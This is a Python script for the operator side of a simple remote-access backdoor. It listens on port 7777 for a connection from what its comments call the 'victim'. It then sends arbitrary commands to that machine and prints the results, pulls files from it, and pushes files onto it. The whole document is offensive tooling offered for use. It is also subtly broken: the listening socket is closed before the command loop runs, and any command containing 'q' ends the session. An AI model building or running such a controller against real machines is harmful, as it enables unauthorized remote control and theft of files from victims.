#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import socket       #It's module for work with socket
import time         #It's module for work with time

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('', 7777))
    server.listen(1)

    conn, addr = server.accept()
    print(f'[+] Connected:{addr}')


def send_data(data):
    '''It's function for send data to victim'''
    data = data.encode()
    conn.send(data)


def get_data():
    '''It's function for get information from victim'''
    data = conn.recv(10240).decode()
    return data


def main():
    '''It's function for call function and work with user'''
    try:
        while True:
            command = str(input('>>>'))

            if command == '':
                continue

            elif 'download' in command:
                filename = str(input('How will called:'))
                send_data(command)

                with open(filename, 'wb') as file:
                    while True:
                        text = conn.recv(2048)

                        if text == b'ST0P':
                            break
                        else:
                            file.write(text)


            elif 'upload' in command:
                filename = str(input('filename:'))
                send_data(command)

                with open(filename, 'rb') as file:
                    content = file.read(2048)
                    conn.send(content)
                    print(content)
                    time.sleep(1)

                    conn.send('ST0P'.encode())

            elif 'q' in command:
                send_data('q')
                break

            else:
                send_data(command)
                print(get_data())

    except:
        print('Error(server)')

if __name__ == '__main__':
    main()
